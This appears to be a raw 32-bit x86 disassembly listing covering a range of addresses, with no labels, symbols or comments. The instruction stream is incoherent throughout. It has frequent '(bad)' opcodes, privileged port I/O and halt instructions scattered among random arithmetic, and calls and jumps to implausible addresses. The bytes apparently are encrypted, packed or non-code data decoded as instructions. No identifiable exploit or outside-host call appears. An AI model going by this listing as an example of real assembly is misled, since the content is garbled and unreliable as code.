  492dc7:	mov    WORD PTR [edx-0x27],ss
  492dca:	adc    ah,cl
  492dcc:	mov    eax,0xfb5dec70
  492dd1:	(bad)  
  492dd2:	push   esi
  492dd3:	or     al,BYTE PTR [edi+0x18]
  492dd6:	cmp    dh,BYTE PTR [esi+0x5c77d877]
  492ddc:	outs   dx,DWORD PTR ds:[esi]
  492ddd:	pop    ebp
  492dde:	add    eax,0x1b9055d2
  492de3:	xor    DWORD PTR [ecx-0x4f],0x24b96625
  492dea:	push   edx
  492deb:	mov    ebp,0x785595e2
  492df0:	dec    ebp
  492df1:	call   0xd662e0e
  492df6:	lods   al,BYTE PTR ds:[esi]
  492df7:	mov    ds:0x93ea24d0,eax
  492dfc:	adc    edi,DWORD PTR [ecx-0x56]
  492dff:	dec    ebx
  492e00:	push   0x4f705238
  492e05:	mov    bl,0x89
  492e07:	iret   
  492e08:	dec    esp
  492e09:	adc    dl,dh
  492e0b:	pop    esp
  492e0c:	mov    eax,ds:0xdee9504b
  492e11:	xchg   edx,eax
  492e12:	loope  0x492e69
  492e14:	in     al,0xb8
  492e16:	int3   
  492e17:	push   ss
  492e18:	cmp    eax,edx
  492e1a:	push   ebp
  492e1b:	imul   edi,DWORD PTR [ebx-0x4f],0xee3f454b
  492e22:	pop    edx
  492e23:	loope  0x492dad
  492e25:	stos   DWORD PTR es:[edi],eax
  492e26:	out    0xa3,eax
  492e28:	inc    esi
  492e29:	in     eax,dx
  492e2a:	mov    eax,ds:0xe0abb9e1
  492e2f:	adc    esi,ebx
  492e31:	ins    BYTE PTR es:[edi],dx
  492e32:	mov    bh,0x21
  492e34:	test   BYTE PTR [ebx],0x29
  492e37:	pop    eax
  492e38:	clc    
  492e39:	mov    ah,0xe0
  492e3b:	dec    ebp
  492e3c:	loopne 0x492df8
  492e3e:	lods   al,BYTE PTR ds:[esi]
  492e3f:	inc    ecx
  492e40:	mov    ch,0xed
  492e42:	mov    ?,WORD PTR [ebp-0x3388e3e0]
  492e48:	adc    bl,bl
  492e4a:	retf   
  492e4b:	dec    edi
  492e4c:	enter  0x5c85,0xbc
  492e50:	(bad)  
  492e52:	mov    edx,0xe426f0
  492e57:	and    BYTE PTR [eax],cl
  492e59:	push   ebx
  492e5a:	fsub   DWORD PTR [edx]
  492e5c:	xchg   esp,eax
  492e5d:	jl     0x492ea1
  492e5f:	fdivr  DWORD PTR [edx+0x1de75344]
  492e65:	mov    al,0xf3
  492e67:	frstor [esp+ebx*8-0x7e]
  492e6b:	jle    0x492ee1
  492e6d:	mov    eax,0xc9c431e4
  492e72:	leave  
  492e73:	push   esp
  492e74:	push   ebx
  492e75:	in     al,0xa3
  492e77:	(bad)  
  492e78:	imul   eax,DWORD PTR [eax+edi*8-0x242f9dea],0x70
  492e80:	sub    al,0x8
  492e82:	sub    eax,0x10d48038
  492e87:	loop   0x492ee6
  492e89:	mov    cl,0x3f
  492e8b:	aam    0xa3
  492e8d:	loope  0x492eb6
  492e8f:	push   eax
  492e90:	dec    edi
  492e91:	mov    ah,0x3a
  492e93:	int3   
  492e94:	jo     0x492e34
  492e96:	aaa    
  492e97:	jnp    0x492ef9
  492e99:	pop    esp
  492e9a:	mov    ch,0xc9
  492e9c:	mov    edx,0x8bdcb8e0
  492ea1:	sub    DWORD PTR [ebx+0x2a],edx
  492ea4:	aas    
  492ea5:	add    eax,0x2754e82a
  492eaa:	clc    
  492eab:	push   ds
  492eac:	in     al,0xad
  492eae:	xchg   ecx,eax
  492eaf:	es loopne 0x492e79
  492eb2:	add    eax,0x2a3014d8
  492eb7:	cwde   
  492eb8:	sbb    bh,cl
  492eba:	sbb    al,0xbd
  492ebc:	(bad)  
  492ebd:	call   0xc97eab39
  492ec2:	pop    es
  492ec3:	sbb    cl,BYTE PTR [ebp-0x5b33eafa]
  492ec9:	mov    bh,0xd3
  492ecb:	loope  0x492f31
  492ecd:	push   ebx
  492ece:	test   ebx,ebp
  492ed0:	jo     0x492ec2
  492ed2:	dec    ecx
  492ed3:	nop
  492ed4:	fldenv [ecx]
  492ed6:	pop    ss
  492ed7:	js     0x492f24
  492ed9:	cdq    
  492eda:	add    eax,0x26439d81
  492edf:	nop
  492ee0:	and    ecx,DWORD PTR [ecx+0x28]
  492ee3:	adc    DWORD PTR [edx+edx*4+0x13],esp
  492ee7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  492ee8:	mov    edi,0x73f21c91
  492eed:	ja     0x492f3d
  492eef:	int3   
  492ef0:	mov    edx,0x32daf40a
  492ef5:	ret    
  492ef6:	mov    eax,ds:0x2d80323f
  492efb:	icebp  
  492efc:	pop    ss
  492efd:	push   eax
  492efe:	xor    al,0x33
  492f00:	cmp    DWORD PTR [ecx],edi
  492f02:	xor    dh,BYTE PTR [edi]
  492f04:	xor    ebx,DWORD PTR [edx+0x1]
  492f07:	hlt    
  492f08:	pop    ds
  492f09:	dec    eax
  492f0a:	cdq    
  492f0b:	dec    DWORD PTR [esi]
  492f0d:	jmp    0x492f0e
  492f0f:	and    al,dh
  492f11:	loopne 0x492efa
  492f13:	loope  0x492f14
  492f15:	fild   WORD PTR [edx+ebx*8]
  492f18:	xor    dl,ch
  492f1a:	call   0xed6937eb
  492f1f:	in     eax,0xee
  492f21:	loope  0x492f18
  492f23:	out    dx,al
  492f24:	in     al,0xe8
  492f26:	in     al,dx
  492f27:	out    dx,al
  492f28:	and    dh,ch
  492f2a:	(bad)  
  492f2b:	jg     0x492f64
  492f2d:	(bad)  
  492f2f:	out    dx,eax
  492f30:	ss loop 0x492f1b
  492f33:	and    ah,ah
  492f35:	in     eax,0xed
  492f37:	cld    
  492f38:	jecxz  0x492f22
  492f3a:	and    DWORD PTR ds:0x20c0cd0a,ecx
  492f40:	int    0xce
  492f42:	xchg   edi,eax
  492f43:	adc    al,0xf4
  492f45:	test   ah,0xc5
  492f48:	rol    al,1
  492f4a:	adc    al,0x57
  492f4c:	bound  ebp,QWORD PTR gs:[ebp-0x2a]
  492f50:	and    BYTE PTR [ebx-0x25],bl
  492f53:	std    
  492f54:	call   DWORD PTR [edx+0x34]
  492f57:	xor    dh,BYTE PTR [ecx+esi*1]
  492f5a:	cmp    BYTE PTR [ebx],dh
  492f5c:	xor    dh,BYTE PTR [eax]
  492f5e:	xor    eax,0x3e373633
  492f63:	add    DWORD PTR ds:0xa6f3a830,esi
  492f69:	in     eax,0xe9
  492f6b:	sbb    esi,esi
  492f6d:	mov    ebp,0xeddf4a6d
  492f72:	jbe    0x492f5e
  492f74:	icebp  
  492f75:	and    ah,al
  492f77:	and    DWORD PTR [eax],0xd06eb44e
  492f7d:	and    DWORD PTR [eax+0x31],esi
  492f80:	pop    esi
  492f81:	or     DWORD PTR [ecx],esi
  492f83:	pop    ecx
  492f84:	ins    DWORD PTR es:[edi],dx
  492f85:	cmp    esi,0xe2e4c277
  492f8b:	in     eax,0xf2
  492f8d:	and    dl,ah
  492f8f:	sti    
  492f90:	and    ah,bl
  492f92:	repz div esp
  492f95:	in     eax,0x82
  492f97:	jbe    0x492f46
  492f99:	loopne 0x492fbb
  492f9b:	icebp  
  492f9c:	out    dx,al
  492f9d:	push   ds
  492f9e:	stc    
  492f9f:	jp     0x492f89
  492fa1:	adc    ch,BYTE PTR [eax]
  492fa3:	loopne 0x492feb
  492fa5:	mov    ss,WORD PTR [eax+0x20]
  492fa8:	push   0x6b1cec50
  492fad:	adc    DWORD PTR ds:[esi-0x78c01300],eax
  492fb4:	add    BYTE PTR [ecx],al
  492fb6:	xchg   DWORD PTR [ebp+0x7b],edx
  492fb9:	fdivr  DWORD PTR [ebx]
  492fbb:	push   ecx
  492fbc:	out    0xe0,eax
  492fbe:	test   eax,0x7721ede0
  492fc3:	hlt    
  492fc4:	or     BYTE PTR ds:0x97f007ce,0x62
  492fcb:	ins    BYTE PTR es:[edi],dx
  492fcc:	dec    edx
  492fcd:	xchg   cl,al
  492fcf:	ds pushf 
  492fd1:	fs push cs
  492fd3:	inc    esp
  492fd4:	or     eax,0x7c5866b5
  492fd9:	dec    eax
  492fda:	dec    esi
  492fdb:	ss xchg edi,eax
  492fdd:	and    DWORD PTR [ebp+0x191887f],edx
  492fe3:	test   DWORD PTR [ebp+0x6e],0x73696c67
  492fea:	push   0x4367d016
  492fef:	aas    
  492ff0:	fs imul esi,DWORD PTR fs:[ebx-0x14b522e0],0xb7728e43
  492ffc:	aas    
  492ffd:	sbb    ch,BYTE PTR [ebx+0x2]
  493000:	pop    edi
  493001:	cmp    ebp,DWORD PTR [ecx]
  493003:	and    BYTE PTR [ecx+0x62],ah
  493006:	in     al,0x7b
  493008:	fdiv   QWORD PTR [edx-0x7396f4f9]
  49300e:	aas    
  49300f:	push   eax
  493010:	inc    ebx
  493011:	ja     0x492fff
  493013:	gs inc edx
  493015:	push   ebx
  493016:	pop    ss
  493017:	jg     0x493039
  493019:	jb     0x492fbb
  49301b:	mov    WORD PTR [edi+0x20],ss
  49301e:	loop   0x493096
  493020:	pop    eax
  493021:	and    BYTE PTR [ebx-0x43],bl
  493024:	or     DWORD PTR [edx+eiz*1],ebp
  493027:	and    BYTE PTR [ebx-0x29],dh
  49302a:	cmp    dh,BYTE PTR [ebx]
  49302c:	sub    eax,0xdafd21d
  493031:	and    dh,dh
  493033:	sub    bh,0xda
  493036:	enter  0x143a,0x2f
  49303a:	push   ebx
  49303b:	pop    edi
  49303c:	and    BYTE PTR [eax],bl
  49303e:	sub    eax,DWORD PTR [eax]
  493040:	sahf   
  493041:	nop
  493042:	cmp    dl,BYTE PTR [edi-0x40]
  493045:	lahf   
  493046:	frstor [eax]
  493048:	fwait
  493049:	and    BYTE PTR [esi+0x3e],ch
  49304c:	jo     0x4930c2
  49304e:	jae    0x49308a
  493050:	sub    BYTE PTR [eax],bl
  493052:	ss add eax,0x84206f57
  493058:	into   
  493059:	in     eax,dx
  49305a:	popa   
  49305b:	add    al,0x43
  49305d:	das    
  49305e:	adc    DWORD PTR [ecx],ebx
  493060:	mov    dh,0x85
  493062:	inc    edx
  493063:	out    dx,eax
  493064:	stos   DWORD PTR es:[edi],eax
  493065:	fistp  WORD PTR [ecx]
  493067:	pop    es
  493068:	xor    ch,ch
  49306a:	ffree  st(1)
  49306c:	and    BYTE PTR [edi+0x66],ch
  49306f:	and    BYTE PTR [edi+0x73],al
  493072:	push   cs
  493073:	outs   dx,BYTE PTR ds:[esi]
  493074:	sub    eax,0x52d70010
  493079:	outs   dx,BYTE PTR ds:[esi]
  49307a:	scas   eax,DWORD PTR es:[edi]
  49307b:	or     al,0x23
  49307d:	pop    eax
  49307e:	xor    DWORD PTR [edx+0x4b],edi
  493081:	pop    esi
  493082:	aas    
  493083:	inc    edi
  493084:	into   
  493085:	add    al,ch
  493087:	xchg   edx,eax
  493088:	or     BYTE PTR [edi],dl
  49308a:	mov    esi,0xc787b9
  49308f:	adc    edi,esi
  493091:	push   ebp
  493092:	outs   dx,BYTE PTR ds:[esi]
  493093:	xchg   ebp,eax
  493094:	push   ss
  493095:	cmp    al,0x2c
  493097:	xor    eax,edi
  493099:	or     eax,0x3416558
  49309e:	adc    DWORD PTR [edx+0x37],ecx
  4930a1:	pop    edi
  4930a2:	add    eax,0x3724d06d
  4930a7:	(bad)  
  4930a8:	or     ebp,DWORD PTR [esi]
  4930aa:	jb     0xe012e011
  4930b0:	or     al,0x3a
  4930b2:	add    eax,0x81af04df
  4930b7:	fisub  WORD PTR [eax+ebx*8+0x1f]
  4930bb:	add    eax,0x15a1bf8f
  4930c0:	sub    BYTE PTR [ebp-0x71],dl
  4930c3:	pop    edx
  4930c4:	or     eax,0xf717505a
  4930c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4930ca:	outs   dx,BYTE PTR ds:[esi]
  4930cb:	adc    DWORD PTR [edi+eax*2],ebx
  4930ce:	pop    ds
  4930cf:	xor    esp,DWORD PTR [edi]
  4930d1:	and    eax,0x9ba6bb7
  4930d6:	lahf   
  4930d7:	aaa    
  4930d8:	daa    
  4930d9:	or     eax,0xc5db92f6
  4930de:	push   esi
  4930df:	retf   0x2f61
  4930e2:	or     bl,BYTE PTR [eax+0x50]
  4930e5:	daa    
  4930e6:	mov    ah,0x4c
  4930e8:	mov    ch,0x64
  4930ea:	or     al,0x4e
  4930ec:	add    BYTE PTR [edi],ch
  4930ee:	fstp   QWORD PTR [edx]
  4930f0:	adc    al,0x2f
  4930f2:	sub    ah,ah
  4930f4:	rcl    DWORD PTR [esp+ebx*4-0x1c],0xb7
  4930f9:	es inc esp
  4930fb:	mov    eax,ds:0x34bc8c54
  493100:	mov    esi,0xa1722470
  493105:	rcl    DWORD PTR [esp+ebp*8],0x48
  493109:	clc    
  49310a:	ins    DWORD PTR es:[edi],dx
  49310b:	mov    ds,esp
  49310d:	or     al,0x34
  49310f:	add    DWORD PTR [ecx+0x14769882],esi
  493115:	xchg   esi,eax
  493116:	add    al,0xf0
  493118:	cmp    cl,al
  49311a:	outs   dx,DWORD PTR ds:[esi]
  49311b:	inc    esp
  49311c:	fidivr DWORD PTR [eax*1-0xf9ae7db]
  493123:	pop    ecx
  493124:	push   esp
  493125:	es pop ecx
  493127:	(bad)  
  493128:	hlt    
  493129:	call   0x44ea:0x4df55b11
  493130:	adc    ch,dh
  493132:	or     BYTE PTR [ecx-0x6998999a],0x1e
  493139:	and    al,0x8
  49313b:	es push es
  49313d:	sub    BYTE PTR [ebx-0x1d],al
  493140:	fdiv   DWORD PTR [edi+0x18]
  493143:	sub    esp,DWORD PTR [eax]
  493145:	pop    ebp
  493146:	in     al,0xe7
  493148:	mov    ch,0x9
  49314a:	cmp    esp,DWORD PTR [esi+edx*4-0x32e8e77d]
  493151:	imul   ebp,DWORD PTR [eax],0x0
  493154:	nop
  493155:	out    dx,al
  493156:	push   eax
  493157:	sub    BYTE PTR [esp+ebp*8],cl
  49315a:	and    DWORD PTR [edi-0x15c29794],eax
  493160:	or     al,0x64
  493162:	dec    ecx
  493163:	add    edx,DWORD PTR [ebx+0x182ad4b6]
  493169:	and    BYTE PTR fs:0x4b9cd643,dl
  493170:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  493171:	jns    0x49310b
  493173:	inc    ebp
  493174:	xchg   edi,eax
  493175:	enter  0x4554,0xe4
  493179:	xor    BYTE PTR [ecx],0x18
  49317c:	or     ecx,DWORD PTR [edi+0x28]
  49317f:	add    eax,ebx
  493181:	sbb    esp,DWORD PTR [ebx+0x56]
  493184:	push   ebp
  493185:	sbb    eax,0xa77e0090
  49318a:	or     DWORD PTR [ebx],ebx
  49318c:	hlt    
  49318d:	mov    eax,0x9ba0556c
  493192:	push   esp
  493193:	ss mov edi,0x53249899
  493199:	lock add BYTE PTR [edx+0x4d],0x8e
  49319e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49319f:	lock hlt 
  4931a1:	sub    al,0xc1
  4931a3:	inc    esp
  4931a4:	sbb    eax,0x555d031a
  4931a9:	add    DWORD PTR [edx],0xffffffa4
  4931ac:	loop   0x4931ce
  4931ae:	and    eax,0x877f4b7
  4931b3:	cmp    ebx,0x2f
  4931b6:	ins    DWORD PTR es:[edi],dx
  4931b7:	ins    DWORD PTR es:[edi],dx
  4931b8:	das    
  4931b9:	jns    0x4931bb
  4931bb:	iret   
  4931bc:	daa    
  4931bd:	xchg   ebx,eax
  4931be:	arpl   WORD PTR [ebp+0x23],cx
  4931c1:	test   bh,dh
  4931c3:	fsub   st,st(4)
  4931c5:	add    al,0x81
  4931c7:	jae    0x493192
  4931c9:	fcom   QWORD PTR [ebp-0x4d]
  4931cc:	mov    al,0xfc
  4931ce:	pusha  
  4931cf:	gs in  eax,0x9c
  4931d2:	lock push ebp
  4931d4:	inc    ebp
  4931d5:	add    BYTE PTR [ecx+0x6a],bh
  4931d8:	test   BYTE PTR [ebx],dl
  4931da:	jecxz  0x493231
  4931dc:	inc    ebp
  4931dd:	dec    esi
  4931de:	dec    ebx
  4931df:	fadd   st(2),st
  4931e1:	ja     0x4931ba
  4931e3:	dec    eax
  4931e4:	push   esi
  4931e5:	cmp    DWORD PTR [ebp+0x565c481c],eax
  4931eb:	dec    edi
  4931ec:	push   esi
  4931ed:	dec    eax
  4931ee:	xchg   ah,ah
  4931f0:	and    dh,BYTE PTR [edx]
  4931f2:	mov    ah,0xa1
  4931f4:	in     al,0xa
  4931f6:	cmp    eax,ecx
  4931f8:	mov    ebx,0x921c9039
  4931fd:	xor    esp,DWORD PTR [eax]
  4931ff:	push   edi
  493200:	xor    al,0x57
  493202:	leave  
  493203:	inc    ebp
  493204:	jb     0x493210
  493206:	daa    
  493207:	push   edi
  493208:	xor    al,0x15
  49320a:	jb     0x49319c
  49320c:	or     al,0x8c
  49320e:	mov    al,ds:0xc9432432
  493213:	xchg   ebx,eax
  493214:	xor    eax,0xe42992f8
  493219:	inc    ecx
  49321a:	or     al,0x58
  49321c:	inc    DWORD PTR [eax+0x72]
  49321f:	dec    eax
  493220:	xchg   BYTE PTR [esi],dh
  493222:	fs pop eax
  493224:	cs xchg edx,eax
  493226:	push   edi
  493227:	enter  0x6b78,0x58
  49322b:	aaa    
  49322c:	nop
  49322d:	and    DWORD PTR [eax+ecx*2-0x30],0xffffffe4
  493232:	and    DWORD PTR [ecx],ebx
  493234:	dec    edx
  493235:	scas   al,BYTE PTR es:[edi]
  493236:	xlat   BYTE PTR ds:[ebx]
  493237:	cmp    BYTE PTR [edi+0x3cc90390],ah
  49323d:	pop    ecx
  49323e:	push   eax
  49323f:	pop    ecx
  493240:	inc    ebx
  493241:	pop    ecx
  493242:	leave  
  493243:	nop
  493244:	pop    esp
  493245:	and    al,0x39
  493247:	test   al,0x94
  493249:	pop    esp
  49324a:	and    DWORD PTR [edi],eax
  49324c:	mov    esp,0xa1d40aaf
  493251:	xor    eax,0x5d76cf30
  493256:	arpl   dx,sp
  493258:	setg   BYTE PTR [ebx]
  49325b:	pop    es
  49325c:	push   0x9b747a2c
  493261:	sbb    bh,0x28
  493264:	pop    edx
  493265:	mov    bl,0x54
  493267:	jo     0x4931fd
  493269:	mov    ah,0x6d
  49326b:	xchg   edx,eax
  49326c:	dec    ebp
  49326d:	sub    BYTE PTR [edi],al
  49326f:	add    BYTE PTR [esi],cl
  493271:	or     BYTE PTR [esi+0x41],0x78
  493275:	xor    esi,DWORD PTR [edi+0x0]
  493278:	add    bl,bh
  49327a:	fdivr  DWORD PTR ds:0xb1354db
  493280:	push   esp
  493281:	push   eax
  493282:	into   
  493283:	and    BYTE PTR [edx+eax*1+0x63404865],cl
  49328a:	sti    
  49328b:	test   BYTE PTR [ecx+esi*4],ah
  49328e:	pop    esp
  49328f:	pop    esp
  493290:	cs pop esp
  493292:	bound  edi,QWORD PTR [ecx+0x73]
  493295:	jmp    0x49329d
  493297:	mov    esi,0x6244aa2d
  49329c:	gs clc 
  49329e:	xor    bl,BYTE PTR [esi+0x27]
  4932a1:	test   DWORD PTR [edi-0xdfa544],ebp
  4932a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4932a8:	loope  0x4932e7
  4932aa:	xchg   ebx,eax
  4932ab:	cmp    edi,esp
  4932ad:	mov    ecx,0x63485ad0
  4932b2:	add    ecx,eax
  4932b4:	cld    
  4932b5:	lahf   
  4932b6:	imul   esi,DWORD PTR [ebx+0x6c],0xa6e98725
  4932bd:	pop    edx
  4932be:	cmp    eax,0x275621c3
  4932c3:	test   ebx,edx
  4932c5:	push   edi
  4932c6:	and    DWORD PTR [edi+0x24],ebp
  4932c9:	push   esi
  4932ca:	inc    edi
  4932cb:	addr16 pop ebx
  4932cd:	pop    ebx
  4932ce:	iret   
  4932cf:	pop    edx
  4932d0:	iret   
  4932d1:	aam    0x64
  4932d3:	sti    
  4932d4:	xchg   DWORD PTR [ecx],edi
  4932d6:	in     al,0x90
  4932d8:	fist   DWORD PTR [ebx+edx*1-0x10]
  4932dc:	in     al,dx
  4932dd:	call   0xe8cc3c6
  4932e2:	in     al,0xe0
  4932e4:	fmul   QWORD PTR [edx+0x41]
  4932e7:	push   cs
  4932e8:	cmp    esp,ecx
  4932ea:	enter  0xe20,0xe4
  4932ee:	adc    BYTE PTR [edi+0x6e],bh
  4932f1:	pop    ebx
  4932f2:	aam    0x63
  4932f4:	inc    ebx
  4932f5:	sbb    ch,ah
  4932f7:	mov    bh,0x37
  4932f9:	xchg   edi,eax
  4932fa:	pop    edi
  4932fb:	jecxz  0x493368
  4932fd:	xor    eax,0xa8ff9e90
  493302:	and    bh,BYTE PTR [eax+0x7cd3e662]
  493308:	es cs push es
  49330b:	xchg   esp,eax
  49330c:	pusha  
  49330d:	inc    eax
  49330e:	xor    BYTE PTR [ebx-0x6b],ah
  493311:	div    DWORD PTR [edi+ebx*4]
  493314:	add    BYTE PTR [edi+ebp*2-0x3bf10b74],bh
  49331b:	push   ss
  49331c:	fnstcw WORD PTR [esi+edi*8-0x67]
  493320:	inc    ecx
  493321:	push   es
  493322:	xor    al,0x73
  493324:	inc    eax
  493325:	add    BYTE PTR [esp+esi*4],al
  493328:	fidiv  DWORD PTR [ecx+ebx*8]
  49332b:	repz stc 
  49332d:	data16 mov bl,0x2c
  493330:	jecxz  0x49332e
  493332:	loop   0x493308
  493334:	or     al,0x41
  493336:	add    BYTE PTR [eax+edi*4+0xe],bl
  49333a:	sar    DWORD PTR [edx+ebx*4+0x4f],cl
  49333e:	mov    BYTE PTR [esi+edx*1+0xcafbc6c],bh
  493345:	int    0xa7
  493347:	stc    
  493348:	cld    
  493349:	in     al,0x25
  49334b:	inc    edx
  49334c:	add    BYTE PTR [eax+edi*4+0x41788828],dh
  493353:	cmp    BYTE PTR [edi-0xd],cl
  493356:	imul   edi,DWORD PTR [esi],0xb4103140
  49335c:	sub    DWORD PTR [eax+ecx*4-0xc126587],eax
  493363:	mov    dl,0x41
  493365:	add    BYTE PTR [eax-0x58],bl
  493368:	and    al,0x3e
  49336a:	aam    0x23
  49336c:	adc    BYTE PTR [eax+0x69],0xe6
  493370:	lahf   
  493371:	stc    
  493372:	hlt    
  493373:	push   esp
  493374:	inc    esp
  493375:	push   es
  493376:	pushf  
  493377:	les    eax,FWORD PTR [ebx+0x0]
  49337a:	xor    al,0x8e
  49337c:	inc    esi
  49337d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49337e:	stc    
  49337f:	xor    al,0xdf
  493381:	push   es
  493382:	pusha  
  493383:	push   eax
  493384:	or     al,0x9c
  493386:	pop    ebx
  493387:	dec    esp
  493388:	mov    ebx,0xc4f9534f
  49338d:	out    dx,al
  49338e:	inc    ebx
  49338f:	add    BYTE PTR [edi+edx*8+0x7eb8c864],dl
  493396:	push   es
  493397:	sar    DWORD PTR [esi+ebx*4-0x1a],cl
  49339b:	pop    esp
  49339c:	pushf  
  49339d:	sub    al,0x24
  49339f:	hlt    
  4933a0:	fwait
  4933a1:	in     al,dx
  4933a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4933a3:	stc    
  4933a4:	cmp    al,0xcf
  4933a6:	mov    esp,0x9c9484b4
  4933ab:	fs cmp al,0xef
  4933ae:	ds int 0x74
  4933b1:	fwait
  4933b2:	inc    esp
  4933b3:	mov    al,0x41
  4933b5:	test   BYTE PTR [esi],0xf4
  4933b8:	mov    eax,0xf7be69f7
  4933bd:	int3   
  4933be:	ss pushf 
  4933c0:	push   es
  4933c1:	pop    eax
  4933c2:	mov    ds:0x46a2f828,eax
  4933c7:	repz into 
  4933c9:	mov    bl,0x7d
  4933cb:	push   es
  4933cc:	nop
  4933cd:	test   eax,0xaaa9347e
  4933d2:	push   es
  4933d3:	or     al,0x38
  4933d5:	(bad)  [edi-0x21]
  4933d8:	rcr    BYTE PTR [esi],1
  4933da:	cld    
  4933db:	stos   DWORD PTR es:[edi],eax
  4933dc:	pushw  es
  4933de:	or     al,0x45
  4933e0:	push   esi
  4933e1:	fadd   QWORD PTR [esp+edi*2-0x66]
  4933e5:	scas   eax,DWORD PTR es:[edi]
  4933e6:	push   ebx
  4933e7:	xchg   esp,eax
  4933e8:	push   esp
  4933e9:	push   es
  4933ea:	rcr    BYTE PTR [ebx],1
  4933ec:	mov    al,ds:0x9b362bf8
  4933f1:	in     eax,dx
  4933f2:	shl    DWORD PTR [eax-0x47f1ce00],cl
  4933f8:	xor    DWORD PTR [esi*1+0x174634e4],edx
  4933ff:	out    dx,eax
  493400:	imul   ebp,DWORD PTR [eax+0x38],0xdc367006
  493407:	sub    BYTE PTR [edi],bh
  493409:	inc    BYTE PTR [ebp+0x167801eb]
  49340f:	(bad)  
  493410:	mov    eax,0x520d5ba0
  493415:	or     cl,BYTE PTR [ebp+0x5d40a847]
  49341b:	hlt    
  49341c:	ins    BYTE PTR es:[edi],dx
  49341d:	and    al,0x73
  49341f:	ja     0x4933b0
  493421:	rol    DWORD PTR [esi],1
  493423:	popa   
  493424:	adc    eax,0x142f7c70
  493429:	xor    ch,al
  49342b:	inc    eax
  49342c:	test   BYTE PTR [ecx+0x4],dl
  49342f:	sub    BYTE PTR [eax-0x117a0fbe],bl
  493435:	add    ecx,esp
  493437:	or     ecx,DWORD PTR [esi+0x32e702a1]
  49343d:	adc    ecx,DWORD PTR [ebx+0x48cc2077]
  493443:	fs push es
  493445:	mov    esi,0xaa6cd907
  49344a:	mov    ch,0x4f
  49344c:	out    dx,al
  49344d:	and    BYTE PTR es:0xfe9a295c,0xff
  493455:	dec    ebx
  493457:	int3   
  493458:	enter  0xd7c9,0xcf
  49345c:	enter  0xcecd,0xdb
  493460:	fcomp  st(2)
  493462:	fxch   st(2)
  493464:	(bad)  
  493466:	(bad)  
  493468:	loopne 0x49344b
  49346a:	jecxz  0x4934c0
  49346c:	in     eax,0xc8
  49346e:	mov    es,WORD PTR [ecx]
  493470:	jmp    0x23ba:0xef866f5e
  493477:	xor    eax,0x65f47472
  49347c:	pop    ds
  49347d:	and    BYTE PTR [ecx],al
  49347f:	popa   
  493480:	je     0x4934a2
  493482:	xor    ah,al
  493484:	add    dh,al
  493486:	es xor BYTE PTR ds:[ecx+0xa],dh
  49348b:	mov    es,WORD PTR ds:0xcd9f6f20
  493491:	ins    DWORD PTR es:[edi],dx
  493492:	mov    esp,0x1f9e3281
  493497:	mov    dl,0x6
  493499:	push   ds
  49349a:	or     eax,0x1326c0d8
  49349f:	sbb    eax,0x7053582f
  4934a4:	test   al,0x1
  4934a6:	test   BYTE PTR [ebp-0x9],bh
  4934a9:	fsub   st(3),st
  4934ab:	into   
  4934ac:	test   DWORD PTR ds:0x801f859c,0xe637c011
  4934b6:	sub    dl,BYTE PTR [ecx-0x67fca4f8]
  4934bc:	xchg   esi,eax
  4934bd:	stos   DWORD PTR es:[edi],eax
  4934be:	sar    ah,0x70
  4934c1:	push   cs
  4934c2:	jno    0x493501
  4934c4:	jne    0x4934e4
  4934c6:	or     dh,BYTE PTR [esi-0x17]
  4934c9:	or     ch,BYTE PTR cs:[esi+0x5e1bfb3f]
  4934d0:	xor    al,0xb6
  4934d2:	js     0x4934fa
  4934d4:	add    eax,0x642a2e25
  4934d9:	aam    0x46
  4934db:	lahf   
  4934dc:	out    0x79,eax
  4934de:	(bad)  
  4934e0:	push   es
  4934e1:	in     al,0xec
  4934e3:	hlt    
  4934e4:	cld    
  4934e5:	add    al,0x72
  4934e7:	cmp    al,0xcf
  4934e9:	repz xor al,0xc
  4934ec:	adc    al,0x1c
  4934ee:	and    al,0x2c
  4934f0:	repz cmp al,0xcf
  4934f3:	repz xor al,0x3c
  4934f6:	inc    esp
  4934f7:	dec    esp
  4934f8:	push   esp
  4934f9:	iret   
  4934fa:	repz cmp al,0xcf
  4934fd:	pop    esp
  4934fe:	fs ins BYTE PTR es:[edi],dx
  493500:	je     0x49357e
  493502:	test   BYTE PTR [edi+ecx*8],bh
  493505:	repz cmp al,0x8c
  493508:	xchg   esp,eax
  493509:	pushf  
  49350a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49350b:	lods   al,BYTE PTR ds:[esi]
  49350c:	repz cmp al,0xcf
  49350f:	repz mov ah,0xbc
  493512:	(bad)  
  493513:	int3   
  493514:	aam    0xcf
  493516:	repz cmp al,0xcf
  493519:	fsubr  st(4),st
  49351b:	in     al,dx
  49351c:	hlt    
  49351d:	cld    
  49351e:	add    dl,BYTE PTR [ebx-0x58fa246d]
  493524:	add    ecx,DWORD PTR [edi]
  493526:	add    al,0x5
  493528:	inc    esi
  493529:	out    0x26,al
  49352b:	lods   al,BYTE PTR ds:[esi]
  49352c:	fs out 0x65,eax
  49352f:	push   0xffffff9e
  493531:	pushf  
  493532:	je     0x49357d
  493534:	punpckhbw mm0,mm0
  493537:	je     0x4935b0
  493539:	daa    
  49353a:	and    ecx,DWORD PTR [edi+0x46]
  49353d:	int3   
  49353e:	and    al,0x78
  493540:	jl     0x493572
  493542:	leave  
  493543:	enter  0x9193,0x79
  493547:	call   0x6545af94
  49354c:	and    ah,ah
  49354e:	leave  
  49354f:	mov    al,ds:0x8fb07b54
  493554:	sbb    al,0x39
  493556:	repnz pop eax
  493558:	jne    0x4935c6
  49355a:	jl     0x49357c
  49355c:	jge    0x49351f
  49355e:	push   ds
  49355f:	pop    ecx
  493560:	(bad)
  493563:	xchg   esp,eax
  493564:	and    ah,bh
  493566:	xchg   DWORD PTR [edx],esi
  493568:	jne    0x4935d9
  49356a:	ror    edi,1
  49356c:	clts   
  49356e:	jmp    0xbfc5736c
  493573:	or     bl,BYTE PTR [esi]
  493575:	adc    BYTE PTR [edx],cl
  493577:	adc    DWORD PTR [eax],eax
  493579:	adc    dl,BYTE PTR [ebx]
  49357b:	repz cmp al,0x17
  49357e:	aad    0x2f
  493580:	add    eax,0x34200646
  493585:	iret   
